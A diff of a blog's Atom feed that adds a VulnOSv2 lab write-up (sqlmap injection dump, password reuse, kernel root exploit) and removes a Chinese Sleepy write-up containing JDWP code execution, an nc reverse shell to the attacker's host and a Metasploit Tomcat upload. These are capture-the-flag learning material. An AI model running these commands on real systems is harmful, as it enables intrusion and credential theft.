@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnhub | tick.Tack]]></title>
   <link href="http://newdominic.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://newdominic.github.io/"/>
-  <updated>2016-06-19T11:59:43+08:00</updated>
+  <updated>2016-06-19T20:30:51+08:00</updated>
   <id>http://newdominic.github.io/</id>
   <author>
     <name><![CDATA[DMC]]></name>
@@ -12,6 +12,116 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[VulnOS]]></title>
+    <link href="http://newdominic.github.io/blog/2016/06/18/vulnosv2/"/>
+    <updated>2016-06-18T18:00:45+08:00</updated>
+    <id>http://newdominic.github.io/blog/2016/06/18/vulnosv2</id>
+    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/vulnos-2,147/">VulnOSv2: 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<p>Nmap scan result</p>
+
+<pre><code>Nmap scan report for 192.168.0.110
+Host is up (0.00042s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+6667/tcp open  irc
+MAC Address: 08:00:27:33:5D:E9 (Cadmus Computer Systems)
+</code></pre>
+
+<h2>Limited Shell</h2>
+
+<p>The index page is the introduction of VulnOSv2, which tells us the target website is under /jabc.</p>
+
+<p><img src="/images/2016-06-19-vulnosv2/1.png"></p>
+
+<p>By examining the source code, we can see that the website is based on Drupal 7. But none of existing exploits could work.</p>
+
+<p>Then I turned to navigate every pages. Finally, when I visited the <strong>Documentation</strong> page, I found some hidden words here. Which tells the customers to visit /jabcd0cs/.</p>
+
+<p><img src="/images/2016-06-19-vulnosv2/2.png"></p>
+
+<p>The /jabcd0cs/ is running OpenDocMan with version 1.2.7, which is vulnerable to SQL injection. There&rsquo;s already an PoC <a href="https://www.exploit-db.com/exploits/32075/">here</a>.</p>
+
+<p>Since the <strong>add_value</strong> is exploitable, I&rsquo;ll left the exploit work to <strong>sqlmap</strong>.</p>
+
+<pre><code># sqlmap -u 'http://192.168.0.110/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user' -p add_value --dump-all
+---snip---
+Database: jabcd0cs
+Table: odm_user
+[2 entries]
++----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+| id | phone       | Email              | username | password                                 | last_name | first_name | department | pw_reset_code |
++----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+| 1  | 5555551212  | webmin@example.com | webmin   | b78aae356709f8c31118ea613980954b         | min       | web        | 2          | &lt;blank&gt;       |
+| 2  | 555 5555555 | guest@example.com  | guest    | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest     | guest      | 2          | NULL          |
++----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+---snip---
+</code></pre>
+
+<p>Sqlmap has cracked the password of <strong>guest</strong> for us. After throwing <strong>webmin</strong>&rsquo;s hashed password into an online md5 cracker, it returned &ldquo;<strong>webmin1980</strong>&rdquo; as result.</p>
+
+<p>There&rsquo;s nothing more I can do with OpenDocMan even logged in as <strong>webmin</strong>. So I decided to take a try on <strong>Password Reuse Attack</strong>.</p>
+
+<pre><code># ssh webmin@192.168.0.110
+webmin@192.168.0.110's password:
+Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Sun Jun 19 11:25:46 CEST 2016
+
+  System load:  0.0               Processes:           86
+  Usage of /:   5.8% of 29.91GB   Users logged in:     0
+  Memory usage: 18%               IP address for eth0: 192.168.0.110
+  Swap usage:   0%
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Last login: Sun Jun 19 11:25:46 2016 from 192.168.0.105
+$
+</code></pre>
+
+<h2>Privilege Escalation</h2>
+
+<p>As the welcome messages says:</p>
+
+<pre><code>Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)
+</code></pre>
+
+<p>Escalating privilege to <strong>root</strong> will be easily done with this <a href="https://www.exploit-db.com/exploits/37292/">exploit</a>.</p>
+
+<pre><code>$ gcc -o exploit 37292.c
+$ chmod +x exploit
+$ ./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(webmin)
+# cat /root/flag.txt
+Hello and welcome.
+You successfully compromised the company "JABC" and the server completely !!
+Congratulations !!!
+Hope you enjoyed it.
+
+What do you think of A.I.?
+#
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Milnet: 1]]></title>
@@ -1154,262 +1264,6 @@ rm -f /home/rene/backup/*.BAK</code></pre></div></p>
                                                                   <span class="m">888</span>                                                   <span class="m">888</span>        888
 Well Done!
 Here<span class="p">&amp;</span>rsquo<span class="p">;</span>s your flag: 0089cd4f9ae79402cdd4e7b8931892b7</code></pre></div></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[/dev/random: Sleepy]]></title>
-    <link href="http://newdominic.github.io/blog/2015/12/20/sleepy/"/>
-    <updated>2015-12-20T16:57:45+08:00</updated>
-    <id>http://newdominic.github.io/blog/2015/12/20/sleepy</id>
-    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/devrandom-sleepy,123/">/dev/random: Sleepy</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
-
-<!--more-->
-
-
-<hr />
-
-<p>nmap掃描結果如下</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/sleepy# nmap -n -T5 192.168.0.117 <span class="p">&amp;</span>ndash<span class="p">;</span>top-ports<span class="o">=</span><span class="m">5000</span> -A&lt;/p&gt;
-
-&lt;p&gt;Starting Nmap 6.49BETA4 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-12-19 23:46 CST
-Warning: 192.168.0.117 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
-Nmap scan report <span class="k">for</span> 192.168.0.117
-Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
-Not shown: <span class="m">4250</span> filtered ports
-PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     vsftpd 2.0.8 or later
-<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
-<span class="p">|</span>&lt;em&gt;Can<span class="p">&amp;</span>rsquo<span class="p">;</span>t get directory listing: TIMEOUT
-8009/tcp open  ajp13   Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
-<span class="p">|</span>&lt;/em&gt;ajp-methods: Failed to get a valid response <span class="k">for</span> the OPTION request
-9001/tcp open  jdwp    Java Debug Wire Protocol <span class="o">(</span>Reference Implementation<span class="o">)</span> version 1.6 1.7.0_71
-MAC Address: 08:00:27:79:0F:C3 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
-Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
-Device <span class="nb">type</span>: general purpose
-Running: Linux 2.6.X<span class="p">|</span>3.X
-OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
-OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
-Network Distance: <span class="m">1</span> hop&lt;/p&gt;
-
-&lt;p&gt;TRACEROUTE
-HOP RTT     ADDRESS
-<span class="m">1</span>   0.31 ms 192.168.0.117&lt;/p&gt;
-
-&lt;p&gt;OS and Service detection performed. Please report any incorrect results at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/submit/&quot;</span>&gt;https://nmap.org/submit/&lt;/a&gt; .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 58.34 seconds</code></pre></div></p>
-
-<p>用anonymous登入ftp後只拿到一張看起來沒有線索的jpg檔，暫時先放到一邊</p>
-
-<p>另外還開了兩個還沒遇過的port，用nc連過去都沒甚麼回應，先google一下一般開啟這兩個port的用途</p>
-
-<p>port 8009大部分的用途是，<a href="https://en.wikipedia.org/wiki/Apache_JServ_Protocol">Apache JServ Protocol</a></p>
-
-<p>說不定自己架一個apache server再proxy過去就能看到網頁了</p>
-
-<p>不過要使用這個功能必須先安裝 libapache2-mod-jk</p>
-
-<p>安裝後再<a href="https://rimuhosting.com/mod_jk2_and_mod_proxy_ajp.jsp">設定</a>讓自己的Apache Server proxy到目標ip後，用瀏覽器就能看到架好的Tomcat Server了</p>
-
-<p><img class="center" src="/images/2015-12-20-sleepy/tomcat.png"></p>
-
-<p>連上後先嘗試登入tomcat的管理介面</p>
-
-<p>不過試了很多組密碼都沒有用，用dirbuster也沒找到可疑的目錄，只能暫時擱置，來看另一個開啟的port</p>
-
-<p>port 9001通常用於<a href="http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html">Java Debug Wire Protocol</a>，可以讓使用者遠端debug JVM</p>
-
-<p>首先找到這篇<a href="http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html">文章</a>，大意是可以透過連入JDWP達到Remote code execution的效果</p>
-
-<p>不過實際拿他的exploit來用(metasploit其實也有內建exploit了)，發現很難猜到目標有使用的物件，繼續再找找有沒有替代方案</p>
-
-<p>再來找到<a href="https://www.exploit-db.com/papers/27179/">這篇</a>：直接用jdb attach到目標後中斷程式，藉由建立新的物件達到執行命令的效果</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/sleepy# jdb -attach 192.168.0.117:9001
-Set uncaught java.lang.Throwable
-Set deferred uncaught java.lang.Throwable
-Initializing jdb <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
-
-&lt;blockquote&gt;&lt;p&gt;</code></pre></div></p></blockquote>
-
-<p>很順利地連上之後，先想辦法讓程式中斷</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;
-
-&lt;blockquote&gt;&lt;p&gt;threads
-Group system:
-  <span class="o">(</span>java.lang.ref.Reference<span class="nv">$ReferenceHandler</span><span class="o">)</span>0x19d Reference Handler cond. waiting
-  <span class="o">(</span>java.lang.ref.Finalizer<span class="nv">$FinalizerThread</span><span class="o">)</span>0x19e  Finalizer         cond. waiting
-  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x19f                         Signal Dispatcher running
-Group main:
-  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x1a1                         main              sleeping
-interrupt 0x1a1&lt;/p&gt;
-
-&lt;p&gt;Exception occurred: java.lang.InterruptedException <span class="o">(</span>uncaught<span class="o">)</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">thread</span><span class="o">=</span>main<span class="p">&amp;</span>rdquo<span class="p">;</span>, java.lang.Thread.sleep<span class="o">()</span>, <span class="nv">line</span><span class="o">=</span>-1 <span class="nv">bci</span><span class="o">=</span>-1&lt;/p&gt;&lt;/blockquote&gt;
-
-&lt;p&gt;main<span class="o">[</span>1<span class="o">]</span></code></pre></div></p>
-
-<p>來試試讓目標彈一個reverse shell回來</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span>  print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>nc 192.168.0.115 <span class="m">12345</span> -e /bin/sh<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>                                         com.sun.tools.example.debug.expr.ParseException: Unable to create java.lang.Runtime instance
- new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>nc 192.168.0.115 <span class="m">12345</span> -e /bin/sh<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span> <span class="o">=</span> null</code></pre></div></p>
-
-<p>失敗。接著換其他指令試試看</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cat /etc/passwd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
- new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cat /etc/passwd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>java.lang.UNIXProcess@6a059fa4<span class="p">&amp;</span>rdquo<span class="p">;</span></code></pre></div></p>
-
-<p>看起來有成功產生物件，但卻看不到內容，稍微研究一下要怎麼<a href="http://stackoverflow.com/questions/4741878/redirect-runtime-getruntime-exec-output-with-system-setout">顯示exec的輸出</a>，拼湊出了下面這難看的解法</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cat /etc/passwd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
- new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cat /etc/passwd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>root:x:0:0:root:/root:/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span></code></pre></div></p>
-
-<p>但是用這方法實在很難操作，後來想到可以找看看tomcat的管理帳密</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">1</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
- new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">1</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;/tomcat-users&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>
-main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">2</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
- new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">2</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;&amp;</span>rdquo<span class="p">;</span>
-main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">3</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
- new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">3</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;sl33py&quot;</span> <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;Gu3SSmYStR0NgPa$sw0rD!&quot;</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">&quot;tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status&quot;</span>/&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span></code></pre></div></p>
-
-<p>帳號是 sl33py，密碼是 Gu3SSmYStR0NgPa$sw0rD。成功登入tomcat管理介面！</p>
-
-<p><img class="center" src="/images/2015-12-20-sleepy/manager.png"></p>
-
-<p>前面在研究tomcat密碼設定的過程中看到一篇<a href="http://roach0426.pixnet.net/blog/post/965149-tomcat%E5%85%A5%E4%BE%B5%E6%94%BB%E9%98%B2%E6%88%B0">文章</a>：有人的伺服器被打入管理介面後塞了一個.war檔進去。</p>
-
-<p>所以就先從file upload+code execution的方向去找exploit</p>
-
-<p>在kali下用searchsploit找看看</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# searchsploit tomcat  <span class="p">|</span>  grep Upload
-Apache Tomcat Manager - Application Upload Authenticated Code Execution                       <span class="p">|</span> ./multiple/remote/31433.rb
-Apache Commons FileUpload and Apache Tomcat - Denial-of-Service                               <span class="p">|</span> ./multiple/dos/31615.rb</code></pre></div></p>
-
-<p>第一個看起來有點像是我們想要東西，而要實際操作這個exploit必須要使用metasploit</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# msfconsole -q
-msf &gt; search tomcat
-<span class="p">&amp;</span>hellip<span class="p">;</span>
-exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
-msf &gt; use exploit/multi/http/tomcat_mgr_upload
-msf exploit<span class="o">(</span>tomcat_mgr_upload<span class="o">)</span> &gt;</code></pre></div></p>
-
-<p>設定好之後用show options檢查一下</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">PASSWORD   Gu3SSmYStR0NgPa<span class="nv">$sw0rD</span>!  no        The password <span class="k">for</span> the specified username
-  Proxies                            no        A proxy chain of format <span class="nb">type</span>:host:port<span class="o">[</span>,type:host:port<span class="o">][</span><span class="p">&amp;</span>hellip<span class="p">;</span><span class="o">]</span>
-  RHOST      127.0.0.1               yes       The target address
-  RPORT      <span class="m">80</span>                      yes       The target port
-  TARGETURI  /manager                yes       The URI path of the manager app <span class="o">(</span>/html/upload and /undeploy will be used<span class="o">)</span>
-  USERNAME   sl33py                  no        The username to authenticate as
-  VHOST                              no        HTTP server virtual host</code></pre></div></p>
-
-<p>設定沒問題就給他run下去！成功拿到meterpreter的shell！</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">msf exploit<span class="o">(</span>tomcat_mgr_upload<span class="o">)</span> &gt; run&lt;/p&gt;
-
-&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse handler on 192.168.0.115:12333
-<span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 127.0.0.2:80 - Retrieving session ID and CSRF token<span class="p">&amp;</span>hellip<span class="p">;</span>
-<span class="o">[</span>&lt;em&gt;<span class="o">]</span> 127.0.0.2:80 - Uploading and deploying 9Vw90ot2DD7eS<span class="p">&amp;</span>hellip<span class="p">;</span>
-<span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 127.0.0.2:80 - Executing 9Vw90ot2DD7eS<span class="p">&amp;</span>hellip<span class="p">;</span>
-<span class="o">[</span>&lt;em&gt;<span class="o">]</span> 127.0.0.2:80 - Undeploying 9Vw90ot2DD7eS <span class="p">&amp;</span>hellip<span class="p">;</span>
-<span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Transmitting intermediate stager <span class="k">for</span> over-sized stage<span class="p">&amp;</span>hellip<span class="p">;</span><span class="o">(</span><span class="m">105</span> bytes<span class="o">)</span>
-<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1495598</span> bytes<span class="o">)</span> to 192.168.0.117
-<span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.115:12333 -&gt; 192.168.0.117:37622<span class="o">)</span> at 2015-12-21 00:25:56 +0800&lt;/p&gt;
-
-&lt;p&gt;meterpreter &gt;</code></pre></div></p>
-
-<p>稍微研究一下目標電腦，會知道裡面有個叫sleepy的使用者，而且有個能夠以tomcat身分執行的suid程式</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>cat /etc/passwd
-<span class="p">&amp;</span>hellip<span class="p">;</span>
-sleepy:x:1002:1002::/home/sleepy:/bin/bash
-sh-4.2<span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
-<span class="p">&amp;</span>hellip<span class="p">;</span>
--rwsr-s<span class="p">&amp;</span>mdash<span class="p">;</span>. <span class="m">1</span> root tomcat <span class="m">8669</span> Jan <span class="m">18</span>  <span class="m">2015</span> /usr/bin/nightmare</code></pre></div></p>
-
-<p>而實際執行後會跳出錯誤訊息</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>/usr/bin/nightmare
-<span class="o">[</span>-<span class="o">]</span> error: no tty present</code></pre></div></p>
-
-<p>要tty是吧，試試看能不能用pty<a href="http://stackoverflow.com/questions/1401002/trick-an-application-into-thinking-its-stdin-is-interactive-not-a-pipe">騙一下</a></p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rsquo<span class="p">;</span>
-bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
-/usr/bin/nightmare
-Error opening terminal: unknown.
-<span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?</code></pre></div></p>
-
-<p>看來不能用騙的，最後只好把程式丟回kali分析看看</p>
-
-<p>程式的架構大概是像下面這樣</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">void main<span class="o">()</span>
-<span class="o">{</span>
-    memset<span class="o">(</span>var_a, 0x0, 0x98<span class="o">)</span><span class="p">;</span>
-    sigaction<span class="o">(</span>0x2, 0x40081f, 0<span class="o">)</span><span class="p">;</span>
-    sigaction<span class="o">(</span>0xf, 0x40081f, 0<span class="o">)</span><span class="p">;</span>
-    <span class="k">if</span> <span class="o">(</span>open<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/dev/tty<span class="p">&amp;</span>rdquo<span class="p">;</span>, 0x2<span class="o">)</span> <span class="o">==</span> -1<span class="o">)</span> <span class="o">{</span>
-        puts <span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">[</span>-<span class="o">]</span> error: no tty present<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
-    <span class="o">}</span>
-    <span class="k">else</span> <span class="o">{</span>
-        fire<span class="o">()</span><span class="p">;</span>
-        <span class="k">while</span> <span class="o">(</span>1<span class="o">)</span> <span class="o">{</span>
-            <span class="nb">printf</span> <span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
-            <span class="nv">var_b</span> <span class="o">=</span> getchar <span class="o">()</span><span class="p">;</span>
-            <span class="k">if</span> <span class="o">(</span><span class="nv">var_b</span> <span class="o">==</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>y<span class="p">&amp;</span>rsquo<span class="p">;</span> or <span class="nv">var_b</span> <span class="o">==</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>Y<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="o">{</span>
-                fire<span class="o">()</span><span class="p">;</span>
-            <span class="o">}</span>
-            <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="nv">var_b</span> <span class="o">==</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>n<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="o">||</span> <span class="nv">var_b</span> <span class="o">==</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>N<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="o">{</span>
-                puts <span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>Oops.. <span class="p">&amp;</span>lsquo<span class="p">;</span>n<span class="p">&amp;</span>rsquo<span class="p">;</span> is broken<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
-            <span class="o">}</span>
-        <span class="o">}</span><span class="p">;</span>
-    <span class="o">}</span>
-<span class="o">}</span>&lt;/p&gt;
-
-&lt;p&gt;void fire <span class="o">()</span>
-<span class="o">{</span>
-    system<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/usr/bin/aafire<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
-<span class="o">}</span></code></pre></div></p>
-
-<p>再來是sigaction所指定的函式</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">void sigHandler <span class="o">()</span>
-<span class="o">{</span>
-    train<span class="o">()</span><span class="p">;</span>
-    <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
-<span class="o">}</span>&lt;/p&gt;
-
-&lt;p&gt;void train <span class="o">()</span>
-<span class="o">{</span>
-    setresuid <span class="o">(</span>0, 0, 0, 0<span class="o">)</span><span class="p">;</span>
-    setresgid <span class="o">(</span>0, 0, 0, 0<span class="o">)</span><span class="p">;</span>
-    system <span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/usr/bin/sl -al<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
-<span class="o">}</span></code></pre></div></p>
-
-<p>既然用到了setresuid和setresgid，看來是希望我們對/usr/bin/sl操作來達到提權的目的</p>
-
-<p>花了一段時間，最後用&#8221;replace path to binary&#8221;當關鍵字找到一個神奇的<a href="http://serverfault.com/questions/548320/override-path-to-binary-for-particular-user">解法</a></p>
-
-<p>程式內用sigaction設定了當遇到SIGINT(0x2)和SIGTERM(0xf)時要進入sigHandler</p>
-
-<p>不過因為現在是用meterpreter建的shell，如果下Ctrl+C的話，SIGINT指令會被meterpreter吃掉</p>
-
-<p>只能再建另一個session，用kill -2或-15把signal送出後就拿到root了</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
-/usr/bin/nightmare
-Error opening terminal: unknown.
-<span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>? bash-4.2# id
-id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
-bash-4.2#</code></pre></div></p>
-
-<p>/root/flag.txt是超佔畫面的的七個小矮人，就不放了</p>
 ]]></content>
   </entry>
   
